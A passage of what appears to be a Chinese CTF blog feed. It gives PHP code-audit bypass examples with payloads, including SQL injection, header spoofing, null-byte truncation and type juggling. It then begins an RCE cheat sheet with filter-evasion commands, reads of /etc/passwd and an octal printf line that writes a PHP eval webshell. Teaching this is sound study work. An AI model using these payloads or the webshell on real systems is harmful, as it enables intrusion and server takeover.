print &#39;&lt;p&gt;Wrong guess.&lt;/p&gt;&#39;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt;</code></pre><p>访问页面，发现生成了session<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664808328606-a0f73da1-0a50-4a70-97d4-8d71736bb854.png" alt="image.png"><br>清除session，然后给password传入空值即可<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664808375010-3ec57ea9-72da-4371-8819-1f5e688a8661.png" alt="image.png"></p><h2 id="密码md5比较绕过"><a href="#密码md5比较绕过" class="headerlink" title="密码md5比较绕过"></a>密码md5比较绕过</h2><pre><code class="php">&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);//配置数据库if($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;password&#39;]) &#123;    $conn = mysql_connect(&quot;127.0.0.1:3306&quot;, &quot;root&quot;, &quot;root&quot;);    mysql_select_db(&quot;test&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) &#123;        die(&quot;Connection failed: &quot; . mysql_error($conn));&#125; $user = $_POST[&#39;username&#39;];$pass = md5($_POST[&#39;password&#39;]);$sql = &quot;select password from users where username=&#39;$user&#39;&quot;;//print $sql;$query = mysql_query($sql);if (!$query) &#123;    printf(&quot;Error: %s\n&quot;, mysql_error($conn));    exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);if (($row[&#39;password&#39;]) &amp;&amp; (!strcasecmp($pass, $row[&#39;password&#39;]))) &#123;//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;&#125;else &#123;    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);&#125;&#125;?&gt;</code></pre><p> 只要让row[pw]的值与pass经过md5之后的值相等即可 而$pass经过md5之后的值是我们可以通过正常输入控制的<br>同时，row[pw]的值是从$sql提取出来的<br>目标就一句话：只要我们能够修改$sql的值，此题解决。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664814374666-ee8ceab2-378c-40af-ac86-de012e0bdba0.png" alt="image.png"><br>此时password的值是由我们控制的<br>构造payload:</p><pre><code class="php">username=白居易&#39; and 0=1 union select &quot;e10adc3949ba59abbe56e057f20f883e&quot;#&amp;password=123456</code></pre><p>e10adc3949ba59abbe56e057f20f883e是123456的md5值<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664815167929-5280d428-308b-483d-a2bf-c6edde20d437.png" alt="image.png"></p><h2 id="url二次编码绕过"><a href="#url二次编码绕过" class="headerlink" title="url二次编码绕过"></a>url二次编码绕过</h2><pre><code class="php">&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);  exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;hackerDJ&quot;)&#123;  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;&#125;?&gt;</code></pre><p>二次编码</p><pre><code class="php">http://127.0.0.1/test.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664815455801-b927b743-9aff-4b31-9f70-0b9ff86d7c2b.png" alt="image.png"></p><h2 id="sql闭合绕过"><a href="#sql闭合绕过" class="headerlink" title="sql闭合绕过"></a>sql闭合绕过</h2><pre><code class="php">&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123;    $conn = mysql_connect(&quot;*******&quot;, &quot;****&quot;, &quot;****&quot;);    mysql_select_db(&quot;****&quot;) or die(&quot;Could not select database&quot;);    if ($conn-&gt;connect_error) &#123;        die(&quot;Connection failed: &quot; . mysql_error($conn));&#125; $user = $_POST[user];$pass = md5($_POST[pass]);//select user from php where (user=&#39;admin&#39;)#//exp:admin&#39;)#$sql = &quot;select user from php where (user=&#39;$user&#39;) and (pw=&#39;$pass&#39;)&quot;;$query = mysql_query($sql);if (!$query) &#123;    printf(&quot;Error: %s\n&quot;, mysql_error($conn));    exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;];  if($row[&#39;user&#39;]==&quot;admin&quot;) &#123;    echo &quot;&lt;p&gt;Logged in! Key: *********** &lt;/p&gt;&quot;;  &#125;  if($row[&#39;user&#39;] != &quot;admin&quot;) &#123;    echo(&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;);  &#125;&#125;?&gt;</code></pre><p>这个很简单</p><pre><code class="php">admin&#39;)#</code></pre><h2 id="x-forwarded-for绕过"><a href="#x-forwarded-for绕过" class="headerlink" title="x-forwarded-for绕过"></a>x-forwarded-for绕过</h2><pre><code class="php">&lt;?phpfunction GetIP()&#123;if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];else    $cip = &quot;0.0.0.0&quot;;return $cip;&#125;$GetIPs = GetIP();if ($GetIPs==&quot;1.1.1.1&quot;)&#123;echo &quot;Great! Key is *********&quot;;&#125;else&#123;echo &quot;错误！你的IP不在访问列表之内！&quot;;&#125;?&gt;</code></pre><p> HTTP头添加X-Forwarded-For:1.1.1.1  </p><h2 id="intval函数四舍五入"><a href="#intval函数四舍五入" class="headerlink" title="intval函数四舍五入"></a>intval函数四舍五入</h2><pre><code class="php">&lt;?phpif($_GET[id]) &#123;mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);mysql_select_db(SAE_MYSQL_DB);$id = intval($_GET[id]); ## 这里过滤只有一个intval$query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));if ($_GET[id]==1024) &#123;    echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;    &#125;  else&#123;    echo($query[content]);  &#125;&#125;</code></pre><p>payload:</p><pre><code class="php">?a=1024.1</code></pre><h2 id="浮点数精度忽略"><a href="#浮点数精度忽略" class="headerlink" title="浮点数精度忽略"></a>浮点数精度忽略</h2><p>intval 函数最大的值取决于操作系统:<br>Copy32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。 64 位系统上，最大带符号的 integer 值是 9223372036854775807。 </p><pre><code class="php">if ($req[&quot;number&quot;] != intval($req[&quot;number&quot;]))</code></pre><p> 在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。 输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等  </p><h2 id="常见截断"><a href="#常见截断" class="headerlink" title="常见截断"></a>常见截断</h2><h3 id="iconv-异常字符截断"><a href="#iconv-异常字符截断" class="headerlink" title="iconv 异常字符截断"></a>iconv 异常字符截断</h3><p> iconv遇到不能识别的内容，会从第一个不能识别的字符开始截断，并生成一个E_NOTICE<br>fuzz一下</p><pre><code class="php">&lt;?php$a =&quot;1.php&quot;;$b =&quot;.jpg&quot;;for($i=0; $i&lt;300; $i++)&#123;    $c = $a.chr($i).$b;    $d = iconv(&quot;UTF-8&quot;,&quot;gb2312&quot;, $c);    echo &quot;$i ==&gt; &quot;.$d.&quot;n&quot;;    echo &quot;\n&quot;;&#125;</code></pre><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664851197425-c4dff480-15bc-42b3-b967-1517498a0c2c.png" alt="image.png"></p><p>经过测试， chr(128)到chr(255)都可以截断 ，按理说是截断成1.php，可能环境有点问题吧！</p><h3 id="eregi、ereg可用-00截断"><a href="#eregi、ereg可用-00截断" class="headerlink" title="eregi、ereg可用%00截断"></a>eregi、ereg可用%00截断</h3><p> 功能：正则匹配过滤 条件：要求php&lt;5.3.4   魔术引号关闭<br>详见上文</p><h3 id="move-uploaded-file-用-0截断"><a href="#move-uploaded-file-用-0截断" class="headerlink" title="move_uploaded_file 用\0截断"></a>move_uploaded_file 用\0截断</h3><p>5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7 原来在高版本（受影响版本中），PHP把长度比较的安全检查逻辑给去掉了，导致了漏洞的发生 cve： <a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a><br>move_uploaded_file($_FILES[‘x’][‘tmp_name’],”/tmp/test.php\x00.jpg”)<br>上传抓包修改name为a.php\0jpg（\0是nul字符），可以看到$_FILES[‘xx’][‘name’]存储的字符串是a.php，不会包含\0截断之后的字符，因此并不影响代码的验证逻辑。<br>但是如果通过$_REQUEST方式获取的，则可能出现扩展名期望值不一致的情况，造成“任意文件上传”。</p><h3 id="inclue用-和-截断"><a href="#inclue用-和-截断" class="headerlink" title="inclue用?和#截断"></a>inclue用?和#截断</h3><pre><code class="php">&lt;?php$name=$_GET[&#39;name&#39;];  $filename=$name.&#39;.php&#39;;  include $filename;  ?&gt;</code></pre><p> 当输入的文件名包含URL时，问号截断则会发生，并且这个利用方式不受PHP版本限制，原因是Web服务其会将问号看成一个请求参数。<br><strong>如果能够包含远程文件</strong>时，可以使用?和%23进行伪截断，<strong>该方法对PHP版本没要求</strong>，<strong>但是要求能够包含远程文件,即</strong>allow_url_include=On<br>?原理是把后面的值看成参数，例如<a href="http://172.17.0.3/1.php?.html">http://172.17.0.3/1.php?.html</a><br>#原理就是前面说的#被include认为是锚点，例如<a href="http://172.17.0.3/1.txt#.html%EF%BC%8C#%E5%90%8E%E9%9D%A2%E7%9A%84%E8%A2%AB%E8%AE%A4%E4%B8%BA%E6%98%AF%E9%94%9A%E7%82%B9(%E4%BD%BF%E7%94%A8url%E7%BC%96%E7%A0%81%E5%90%8E%E7%9A%84#---&gt;%23)">http://172.17.0.3/1.txt#.html，#后面的被认为是锚点(使用url编码后的#---&gt;%23)</a><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664852581232-32255fa9-6d2d-4002-8c63-d223c952a637.png" alt="image.png"><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664852618885-b65805ad-8a9f-4963-870e-bdd63b34158f.png" alt="image.png"></p><h2 id="strpos数组绕过NULL与ereg正则-00截断"><a href="#strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="strpos数组绕过NULL与ereg正则%00截断"></a>strpos数组绕过NULL与ereg正则%00截断</h2><p>方法一:%00截断<br>注意点:需将#编码<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664856729744-a800de1d-40cc-498f-bef1-af960c8429dd.png" alt="image.png"></p><p>方法二:数组绕过<br>直接传入一个数组<br>既要是纯数字,又要有’#biubiubiu’，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false,所以符合要求. 所以输入nctf[]= 那为什么ereg()也能符合呢?因为ereg()在出错时返回的也是null,null!==false,所以符合要求.<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664856872643-ee08f73b-d6b9-45d2-bf2b-3123fa02afa1.png" alt="image.png"></p><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a><strong>十六进制与数字比较</strong></h2><pre><code class="php">&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123;    $flag = &#39;flag&#123;test&#125;&#39;;    $one = ord(&#39;1&#39;);  //ord — 返回字符的 ASCII 码值    $nine = ord(&#39;9&#39;); //ord — 返回字符的 ASCII 码值    $number = &#39;3735929054&#39;;    // Check all the input characters!    for ($i = 0; $i &lt; strlen($number); $i++)    &#123;         // Disallow all the digits!        $digit = ord($temp&#123;$i&#125;);        if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )        &#123;            // Aha, digit not allowed!            return &quot;flase&quot;;        &#125;    &#125;    if($number == $temp)        return $flag;&#125;$temp = $_GET[&#39;password&#39;];echo noother_says_correct($temp);?&gt;</code></pre><p> 这里，它不让输入1到9的数字，但是后面却让比较一串数字<br> 在php里面，0x开头则表示16进制，将这串数字转换成16进制之后发现，是deadc0de<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664872563600-ed999410-6755-4b2a-be29-7d799a66485a.png" alt="image.png"><br>在开头加上0x，代表这个是16进制的数字，然后再和十进制的 3735929054比较，答案当然是相同的，返回true拿到flag<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664872687987-b73ff2a8-2ee9-49e6-92b9-9fa66c50e642.png" alt="image.png"></p><h2 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a><strong>数字验证正则绕过</strong></h2><pre><code class="php">&lt;?phperror_reporting(0);$flag = &#39;flag&#123;test&#125;&#39;;if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;]) &#123;     $password = $_POST[&#39;password&#39;];     if (0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)) //preg_match — 执行一个正则表达式匹配    &#123;         echo &#39;Wrong Format&#39;;         exit;     &#125;     while (TRUE)     &#123;         $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;         if (6 &gt; preg_match_all($reg, $password, $arr))             break;         $c = 0;         $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字  [[:upper:]] 任何大写字母  [[:lower:]] 任何小写字母         foreach ($ps as $pt)         &#123;             if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))                 $c += 1;         &#125;         if ($c &lt; 3) break;         //&gt;=3，必须包含四种类型三种与三种以上        if (&quot;42&quot; == $password) echo $flag;         else echo &#39;Wrong password&#39;;         exit;     &#125; &#125;?&gt;</code></pre><p> 意为必须是12个字符以上（非空格非TAB之外的内容）<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878820196-cd2ab7eb-c079-4f8b-8eb4-1a4746b183f2.png" alt="image.png"><br>   意为匹配到的次数要大于6次<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878914886-87653c10-7d3d-4369-8e09-1779ffeda157.png" alt="image.png"><br> 意为必须要有大小写字母，数字，字符内容三种与三种以上<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664878981551-c67275d3-8869-4f35-9a40-f5f2b855c653.png" alt="image.png"><br>传入值 必须等于42<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664879091286-6802d5a4-2753-4d70-aae0-ea2e9f48e862.png" alt="image.png"><br>可构造payload:</p><pre><code class="php">42.00e+00000000000 或420.000000000e-1</code></pre><h2 id="switch没有break-字符与0比较绕过"><a href="#switch没有break-字符与0比较绕过" class="headerlink" title="switch没有break 字符与0比较绕过"></a><strong>switch没有break 字符与0比较绕过</strong></h2><p>首先我们来回顾下switch语句:<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664880863864-69ee9b4d-f83f-4999-94de-684c5fa6433f.png" alt="image.png"><br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664880871606-a49b0ffd-3cd2-4ab2-a99b-1e498624758e.png" alt="image.png"><br>匹配到了2，然后2及其2后面的语句都会执行，且不会再进行匹配。<br>那我们接下来看这个题目:</p><pre><code class="php">&lt;?phperror_reporting(0);if (isset($_GET[&#39;which&#39;]))&#123;    $which = $_GET[&#39;which&#39;];    switch ($which)    &#123;    case 0:    case 1:    case 2:        require_once $which.&#39;.php&#39;;         echo $flag;        break;    default:        echo GWF_HTML::error(&#39;PHP-0817&#39;, &#39;Hacker NoNoNo!&#39;, false);        break;    &#125;&#125;?&gt;</code></pre><p>直接传入test<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664881120398-f8cbf511-b917-4d02-a540-dc4640c33082.png" alt="image.png"><br>因为当一个字符串与数字比较时，会将字符串转换为数字,传入test后就与0匹配，就不会继续进行匹配了。</p><h2 id="利用提交数组绕过逻辑"><a href="#利用提交数组绕过逻辑" class="headerlink" title="利用提交数组绕过逻辑"></a>利用提交数组绕过逻辑</h2><pre><code class="php">&lt;?php $role = &quot;guest&quot;;$flag = &quot;flag&#123;test_flag&#125;&quot;;$auth = false;if(isset($_COOKIE[&quot;role&quot;]))&#123;    $role = unserialize(base64_decode($_COOKIE[&quot;role&quot;]));    if($role === &quot;admin&quot;)&#123;        $auth = true;    &#125;    else&#123;        $auth = false;    &#125;&#125;else&#123;    $role = base64_encode(serialize($role));    setcookie(&#39;role&#39;,$role);&#125;if($auth)&#123;    if(isset($_POST[&#39;filename&#39;]))&#123;        $filename = $_POST[&#39;filename&#39;];        $data = $_POST[&#39;data&#39;];        if(preg_match(&#39;[&lt;&gt;?]&#39;, $data)) &#123;            die(&#39;No No No!&#39;.$data);        &#125;        else &#123;            $s = implode($data);            if(!preg_match(&#39;[&lt;&gt;?]&#39;, $s))&#123;                $flag=&#39;None.&#39;;            &#125;            $rand = rand(1,10000000);            $tmp=&quot;./uploads/&quot;.md5(time() + $rand).$filename;            file_put_contents($tmp, $flag);            echo &quot;your file is in &quot; . $tmp;        &#125;    &#125;    else&#123;        echo &quot;Hello admin, now you can upload something you are easy to forget.&quot;;        echo &quot;there are the source.&quot;;        echo &#39;&lt;textarea rows=&quot;10&quot; cols=&quot;100&quot;&gt;&#39;;        echo htmlspecialchars(str_replace($flag,&#39;flag&#123;???&#125;&#39;,file_get_contents(__FILE__)));        echo &#39;&lt;/textarea&gt;&#39;;    &#125;&#125;else&#123;    echo &quot;Sorry. You have no permissions.&quot;;&#125;?&gt;</code></pre><p>访问页面<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882469000-0dd64e6a-ce6b-4b80-8ab9-974ed08e5a16.png" alt="image.png"><br>首先将cookie的用户修改为admin，并替换<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882512840-8c8d4853-af5c-4dac-a0bf-8c9a1e0d6076.png" alt="image.png"><br>然后再次访问，获得题目源码<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882543396-6c93429c-9f67-486a-b93c-3eaadd79a6b9.png" alt="image.png"></p><p><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882956551-bc37572d-7354-434b-a73c-c6c77ce88bea.png" alt="30_1.png"><br> preg_match只能处理字符串，当传入的subject是数组时会返回false<br>想要通过Post请求的形式传入数组可以使用 data[0]=123&amp;data[1]=&lt;&gt; 的形式传入数组，这样的话在执行 implode() 函数的时候就不会使 &amp;s 为空，成功绕过这段逻辑拿到flag。<br><img src="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/1664882977530-c17d78ee-94a5-482a-b426-04536aece637.png" alt="30_2.png"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h1><p><a href="https://www.cnblogs.com/anbus/p/10000571.html">https://www.cnblogs.com/anbus/p/10000571.html</a><br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a><br><a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a><br><a href="https://www.cnblogs.com/-mo-/p/11652926.html">https://www.cnblogs.com/-mo-/p/11652926.html</a><br><a href="http://t.zoukankan.com/drkang-p-8689205.html">http://t.zoukankan.com/drkang-p-8689205.html</a><br><a href="https://github.com/bowu678/php_bugs">https://github.com/bowu678/php_bugs</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;php弱类型比较&quot;&gt;&lt;a href=&quot;#php弱类型比较&quot; class=&quot;headerlink&quot; title=&quot;php弱类型比较&quot;&gt;&lt;/a&gt;php弱类型比较&lt;/h2&gt;&lt;h3 id=&quot;弱类型与强类型&quot;&gt;&lt;a href=&quot;#弱类型与强类型&quot; </summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="代码审计" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>rce考点总结</title>
    <link href="https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/11/21/rce%E8%80%83%E7%82%B9%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-21T07:17:20.000Z</published>
    <updated>2022-11-22T12:47:08.384Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近准备把所学的漏洞全部仔细的整理一遍，一、是为了让自己对这些知识点有些全面系统的认识 二、是写题的时候可以直接翻博客不需要再去找那么多的文章，此外也希望对以后社团的学弟学妹有些帮助，这些文章的内容只有一部分为我自己写的，很多是搬运师傅的文章，因为很多师傅的文章写的已经十分完美，特别是p神，很多年前发表的东西现在仍不过时。我所做的主要是把文章整合在一起，对漏洞的考点有更加全面的认识！</p><h1 id="什么是rce"><a href="#什么是rce" class="headerlink" title="什么是rce"></a>什么是rce</h1><p>什么是rce?</p><p>既远程代码/命令执行，能够让攻击者直接向后台服务器远程写入服务器系统命令或者代码，从而控制后台系统。</p><p>命令执行：直接执行我们输入的恶意命令</p><p>代码执行：直接执行我们所输入的恶意代码</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>命令执行漏洞形成的原因是web服务器对用户输入的命令安全监测不足，导致恶意代码被执行。</p><p><strong>定义：</strong>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p><p><strong>永远不要相信用户的输入！</strong></p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p> 继承Web服务程序的权限去执行系统命令或读写文件<br> 反弹shell<br> 控制整个网站甚至控制服务器<br> 进一步内网渗透</p><h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><pre><code>system()  输出并返回最后一行shell结果exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面shell_exec()  通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上（替换system）</code></pre><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><pre><code>eval()函数:用来执行一个字符串表达式，并返回表达式的值assert()函数:在php语言中是用来判断一个表达式是否成立,返回true or false,但是字符串参数会被执行</code></pre><h1 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h1><p>我们需要注意，当我们正常输入的时候，在大多数情况下是不会触发这一漏洞的，我们需要一些小tips。</p><p>常见技巧：</p><pre><code class="php">一、常见管道符：‘|’ 直接执行后面的语句‘||’ 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句‘&amp;’ 前面和后面命令都要执行，无论前面真假&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令Linux:Linux系统包含了windows系统上面四个之外，还多了一个 ‘;’ 这个作用和 ‘&amp;’ 作用相同</code></pre><pre><code class="php">二、空格绕过(空格被过滤)：&lt;  --  重定向，如cat&lt;flag.php&lt;&gt;      --   重定向，如cat&lt;&gt;flag.php%09  --  需要php环境，如cat%09flag.php$&#123;IFS&#125;  --  单纯cat$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个&#123;&#125;就固定了变量名，如cat$&#123;IFS2&#125;flag.php$IFS$9  --  后面加个$与&#123;&#125;类似，起截断作用，$9是当前系统shell进程第九个参数持有者，始终为空字符串，如cat$IFS2$9flag.php</code></pre><pre><code class="php">三、黑名单绕过1、拼接a=c;b=at;c=flag;$a$b $ca=c;b=at;c=heb;d=ic;ab&#123;c&#125;&#123;d&#125;2、base64编码echo MTIzCg==|base64 -d 其将会打印123echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash ==&gt;cat /flagecho &quot;Y2F0IC9mbGFn&quot;|base64 -d|sh ==&gt;cat /flag3、hex编码echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag4、单引号、双引号,反单引号绕过ca&#39;&#39;t flag 或ca&quot;&quot;t flagca&#39;&#39;t te&quot;&quot;st.phpc``a``t /etc/passwd5、反斜杠绕过ca\t fl\agcat te\st.php6、绕过ip中的句点网络地址可以转换成数字地址，比如127.0.0.1可以转化为2130706433。可以直接访问http://2130706433或者http://0x7F000001，这样就可以绕过.的ip过滤。在线转换地址：数字转IP地址 IP地址转数字 域名转数字IP7、利用oct编码（八进制）绕过$(printf &quot;\154\163&quot;)  //ls命令$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag#可以通过这样来写webshell,内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php在线转换网站:https://photo333.com/text-to-octal-zh.php8、&#39;/&#39;被过滤绕过可利用&#39;;&#39;拼接命令绕过cd ..;cd ..;cd ..;cd ..;cd etc;cat passwd (也可以利用第七步的八进制绕过)9、通配符绕过列如cat /passwd：??? /e??/?a????cat /e*/pa*10、利用未初始化变量$u绕过cat$u /etc/passwdcat /etc$u/passwd11、glob通配符cat t[a-z]stcat t&#123;a,b,c,d,e,f&#125;st12、利用PATH绕过可以通过截断和拼接来得到我们想要的来getshell$&#123;PATH:5:1&#125; //l$&#123;PATH:2:1&#125; //s$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125; //拼接后是ls,执行命令$&#123;PATH:5:1&#125;s //拼接后是ls,执行命令</code></pre><pre><code class="php">四、绕过长度限制1，通过&gt;来创建文件&gt;flag.txt2，通过&gt;将命令结果存入文件中echo &quot;hello hacker&quot; &gt; flag.txt3，&gt;&gt;符号的作用是将字符串添加到文件内容末尾，不会覆盖原内容echo &quot;hello hacker&quot; &gt;&gt; flag.txt4、Linux中命令换行在Linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加\，可以将一条命令写在多行。比如：cat flagca\t\ fla\g.txt将命令一条一条输入一个文本中再执行:root@kali:~# echo &quot;ca\\&quot;&gt;cmdroot@kali:~# echo &quot;t\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot; fl\\&quot;&gt;&gt;cmdroot@kali:~# echo &quot;ag&quot;&gt;&gt;cmdroot@kali:~# cat cmdca\t\ fl\agroot@kali:~# sh cmdthis is your flag</code></pre><pre><code class="php">五、各种读文件命令cat--由第一行开始显示内容，并将所有内容输出tac--从最后一行倒序显示内容，并将所有内容输出more-- 根据窗口大小，一页一页的现实文件内容less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符head-- 只显示头几行tail --只显示最后几行nl --类似于cat 